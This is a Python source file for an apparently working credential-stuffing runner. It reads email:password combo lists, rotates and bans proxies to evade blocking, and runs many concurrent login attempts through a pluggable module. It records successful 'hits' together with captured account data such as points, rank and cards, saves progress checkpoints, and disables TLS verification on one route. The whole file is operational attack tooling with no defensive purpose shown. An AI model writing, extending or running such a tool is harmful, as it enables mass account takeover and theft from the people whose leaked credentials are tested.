"""
ModuleRunner - Perfect Alignment & Race Condition Fix
"""

import asyncio
import aiohttp
import sys
import os
import time
import ssl
from termcolor import colored
from typing import List, Callable, Optional, Union, Tuple
from collections import Counter, deque

# --- Configuration ---
MAX_PROXY_STRIKES = 10
CHECKPOINT_INTERVAL = 500
ALIGNMENT_PADDING = 55  # Space reserved for email:pass

def process_file(file_path: str) -> List[str]:
    if not file_path or not os.path.exists(file_path):
        return []
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            return [line.strip() for line in f.read().splitlines() if line.strip()]
    except Exception:
        return []

def ready_proxies(proxy_type: str, proxies: List[str]) -> List[str]:
    pt = proxy_type.lower()
    if pt not in ["http", "https", "socks4", "socks5"]:
        return []
    return [f"{pt}://{proxy}" for proxy in proxies]

class ModuleRunner:
    def __init__(
        self,
        module: Callable,
        combo: str,
        proxyless: bool,
        proxy_file: Optional[str],
        proxy_type: str,
        global_route: Optional[str],
        output: str,
        threads: int,
        **kwargs,
    ):
        self.module = module
        self.output = output
        self.combo_path = combo
        self.kwargs = kwargs
        self.concurrency = threads 
        self.proxyless = proxyless
        self.global_route = global_route
        self.running = True
        self.printing = False # Lock to prevent status bar race condition

        # --- LOAD COMBOS ---
        raw_combo = process_file(combo)
        self.start_index = 0
        self.total_processed = 0
        
        self.progress_file = f"{combo}.progress"
        if os.path.exists(self.progress_file):
            try:
                with open(self.progress_file, "r") as f:
                    self.start_index = int(f.read().strip())
                print(colored(f"[+] Found checkpoint! Resuming from line {self.start_index:,}", "green"))
            except:
                print(colored("[!] Corrupt checkpoint file. Starting from 0.", "red"))

        self.combo_deque = deque()
        print(colored("Processing combo...", "cyan"))
        
        sliced_combo = raw_combo[self.start_index:]
        for line in sliced_combo:
            if ":" in line:
                self.combo_deque.append(line.split(":", 1))
        
        self.initial_size = len(self.combo_deque)

        # --- PROXIES ---
        self.proxies = deque()
        self.banned_list = []
        
        if proxy_file:
            raw_proxies = process_file(proxy_file)
            import random
            random.shuffle(raw_proxies) 
            ready_list = ready_proxies(proxy_type, raw_proxies)
            self.proxies = deque(ready_list)
        
        self.hits = []
        self.fails = 0
        self.retries = 0
        self.start_time = 0
        self.proxy_strikes = Counter()

    def get_proxy(self) -> Optional[str]:
        if self.global_route: return self.global_route
        if self.proxyless: return None
        if not self.proxies:
            if self.banned_list:
                self.proxies.extend(self.banned_list)
                self.banned_list.clear()
                self.proxy_strikes.clear() 
            else:
                return None
        proxy = self.proxies[0]
        self.proxies.rotate(-1)
        return proxy

    def ban_proxy(self, proxy: str):
        if proxy == self.global_route: return
        if proxy in self.proxies:
            try:
                self.proxies.remove(proxy)
                self.banned_list.append(proxy)
            except ValueError:
                pass

    def update_checkpoint(self):
        current_progress = self.start_index + self.total_processed
        try:
            with open(self.progress_file, "w") as f:
                f.write(str(current_progress))
        except:
            pass

    async def worker(self, session: aiohttp.ClientSession):
        while self.running:
            try:
                if not self.global_route and not self.proxyless and not self.proxies and not self.banned_list:
                    await asyncio.sleep(1)
                    continue

                try:
                    email, password = self.combo_deque.popleft()
                except IndexError:
                    break 

                proxy = self.get_proxy()
                result = 2 
                capture = ""

                try:
                    response_data = await self.module(session, email, password, proxy, **self.kwargs)
                    if isinstance(response_data, tuple):
                        result, capture = response_data
                    else:
                        result = response_data
                except Exception:
                    pass

                # --- RESULT HANDLING ---
                if result == 0:  # Hit
                    self.hits.append((email, password))
                    self.total_processed += 1
                    
                    # [PRINT LOGIC START]
                    self.printing = True 
                    sys.stdout.write(f"\r\033[K") 
                    
                    tag = colored("[HIT]", 'green', attrs=['bold'])
                    
                    # Pad the combo for alignment
                    combo_txt = f"{email}:{password}"
                    # Truncate if too long to prevent breaking alignment
                    if len(combo_txt) > ALIGNMENT_PADDING - 2:
                        combo_txt = combo_txt[:ALIGNMENT_PADDING-5] + "..."
                    padded_combo = f"{combo_txt:<{ALIGNMENT_PADDING}}" 
                    combo_colored = colored(padded_combo, 'white', attrs=['bold'])
                    
                    final_output = f"{tag} {combo_colored}"

                    # 3. Formatted Stats (Fixed Widths)
                    if capture:
                        stats_parts = []
                        raw_parts = capture.split(" | ")
                        
                        # Define fixed widths for common keys
                        # Key: Width
                        col_widths = {
                            "Points": 15,
                            "Rank": 18,
                            "Cards": 25
                        }

                        for part in raw_parts:
                            if ": " in part:
                                key, val = part.split(": ", 1)
                                
                                # Colorize
                                key_colored = colored(key, 'cyan')
                                val_colored = colored(val, 'yellow')
                                
                                # Calculate padding needed
                                width = col_widths.get(key, 0)
                                if width > 0:
                                    # Create the full colored string, then pad it manually?
                                    # Padding colored strings is hard because invisible codes count as length.
                                    # Better to pad the Value only.
                                    
                                    # Subtract key length + 2 (": ") from width to get value padding
                                    val_padding = width - len(key) - 2
                                    if val_padding < 1: val_padding = 1
                                    
                                    # Re-construct: Key: Value[padded]
                                    # We use ' ' * padding
                                    display_len = len(val)
                                    spaces = ' ' * (val_padding - display_len) if val_padding > display_len else ' '
                                    
                                    stats_parts.append(f"{key_colored}: {val_colored}{spaces}")
                                else:
                                    # No fixed width (e.g. Name), just append
                                    stats_parts.append(f"{key_colored}: {val_colored} ")
                            else:
                                stats_parts.append(colored(part, 'yellow'))
                        
                        final_output += "".join(stats_parts)
                    
                    print(final_output)
                    self.printing = False
                    # [PRINT LOGIC END]
                    
                    self.save_hit(email, password, capture)
                    if proxy and not self.global_route: self.proxy_strikes[proxy] = 0
                
                elif result == 1:  # Fail
                    self.total_processed += 1
                    self.fails += 1
                    if proxy and not self.global_route: self.proxy_strikes[proxy] = 0
                
                elif result == 2:  # Retry
                    self.retries += 1
                    self.combo_deque.append((email, password))
                    
                    if proxy and not self.global_route:
                        self.proxy_strikes[proxy] += 1
                        if self.proxy_strikes[proxy] >= MAX_PROXY_STRIKES:
                            self.ban_proxy(proxy)
                
                if self.total_processed % CHECKPOINT_INTERVAL == 0:
                    self.update_checkpoint()

            except Exception:
                self.printing = False
                pass

    async def monitor(self):
        print("") 
        while self.running:
            await asyncio.sleep(0.5)
            
            # Don't update status bar if a Hit is currently printing
            if self.printing: continue

            elapsed = time.time() - self.start_time
            cpm = int((self.total_processed / elapsed) * 60) if elapsed > 0 else 0
            
            if self.global_route:
                proxy_stat = colored(f"ROUTE ({self.global_route})", "blue")
            elif self.proxyless:
                proxy_stat = colored("NONE", "yellow")
            else:
                active = len(self.proxies)
                banned = len(self.banned_list)
                proxy_stat = f"{colored(f'Active: {active}', 'yellow')} {colored(f'(Banned: {banned})', 'blue')}"
                
                if active == 0 and banned == 0:
                     sys.stdout.write(f"\r\033[K{colored('[!] ALL PROXIES DEAD.', 'red', attrs=['bold'])}")
                     continue
            
            if len(self.combo_deque) == 0:
                self.running = False

            real_total_done = self.start_index + self.total_processed

            status = (
                f"\r\033[K"
                f"{colored(f'Left: {len(self.combo_deque)}', 'cyan')} | "
                f"{colored(f'Done: {real_total_done}', 'green')} | "
                f"{colored(f'Bad: {self.fails}', 'red')} | "
                f"{colored(f'Retry: {self.retries}', 'white')} | "
                f"Proxies: {proxy_stat} | "
                f"{colored(f'CPM: {cpm}', 'magenta')}"
            )
            sys.stdout.write(status)
            sys.stdout.flush()

    def save_hit(self, email, password, capture=""):
        try:
            with open(self.output, "a", encoding="utf-8") as f:
                if capture:
                    f.write(f"{email}:{password} | {capture}\n")
                else:
                    f.write(f"{email}:{password}\n")
        except:
            pass

    def start(self):
        if sys.platform == 'win32':
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        
        try:
            asyncio.run(self.main())
        except KeyboardInterrupt:
            self.running = False
            self.update_checkpoint()
            print(colored("\n\n[!] Stopped by user. Progress saved.", "yellow"))
    
    async def main(self):
        self.start_time = time.time()
        
        if self.global_route:
             ssl_context = ssl.create_default_context()
             ssl_context.check_hostname = False
             ssl_context.verify_mode = ssl.CERT_NONE
             try:
                 ssl_context.set_ciphers('DEFAULT@SECLEVEL=0')
                 ssl_context.options |= 0x4 
             except: pass
             connector = aiohttp.TCPConnector(ssl=ssl_context)
        else:
             connector = aiohttp.TCPConnector(ssl=False, limit=None, ttl_dns_cache=300)

        timeout = aiohttp.ClientTimeout(total=25, connect=8)
        
        print(colored(f"Starting workers... ({len(self.combo_deque)} lines to check)", "green"))
        print(colored(f"Checkpoint file: {self.progress_file}", "cyan"))
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            tasks = [asyncio.create_task(self.worker(session)) for _ in range(self.concurrency)]
            monitor_task = asyncio.create_task(self.monitor())
            
            try:
                await asyncio.gather(*tasks)
            except asyncio.CancelledError:
                pass
            
            monitor_task.cancel()
            sys.stdout.write("\n")

        self.update_checkpoint()
        print(colored(f"\n--- SESSION FINISHED ---", "cyan"))
        print(colored(f"Total Hits: {len(self.hits)}", "green"))